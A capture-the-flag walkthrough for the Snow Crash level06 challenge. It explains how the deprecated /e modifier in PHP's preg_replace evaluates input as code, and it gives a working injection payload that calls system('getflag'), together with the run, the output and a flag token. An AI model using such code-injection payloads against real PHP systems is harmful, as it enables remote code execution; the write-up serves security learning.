## Snow Crash - Level06 Walkthrough

### 🔍 Discovery

After logging in as `level06`, we find two files in the home directory:
```
level06
level06.php
```

We inspect `level06.php`:
```php
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

### 🧠 Understanding the Vulnerability

The critical vulnerability lies in this line:
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

- The `/e` modifier **evaluates the replacement as PHP code**.
- If we control the input file, we can inject PHP code and have it executed.

### 🧪 Crafting the Exploit

We prepare a file with the following payload:
```bash
echo "[x {${system('getflag')}}]" > /tmp/exploit06
```

This matches the pattern `\[x (.*)\]`, where `.*` becomes `{${system('getflag')}}`, and due to the `/e` modifier, this results in execution of `system('getflag')`.

### 🚀 Running the Exploit

We run the vulnerable script with the crafted payload:
```bash
./level06 /tmp/exploit06
```

### 🎯 Result

```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

Despite a few PHP Notices, the flag is successfully retrieved!

### 📚 Notes

- This challenge highlights the danger of the `/e` modifier in `preg_replace`, which has been **deprecated as of PHP 5.5.0** and **removed in PHP 7.0.0**.
- It shows how improperly handling user input and evaluating it as code can lead to Remote Code Execution (RCE).
-
- https://stackoverflow.com/questions/65024562/how-can-e-regex-expression-be-misused-on-a-php-code-snippet-running-on-my-ser
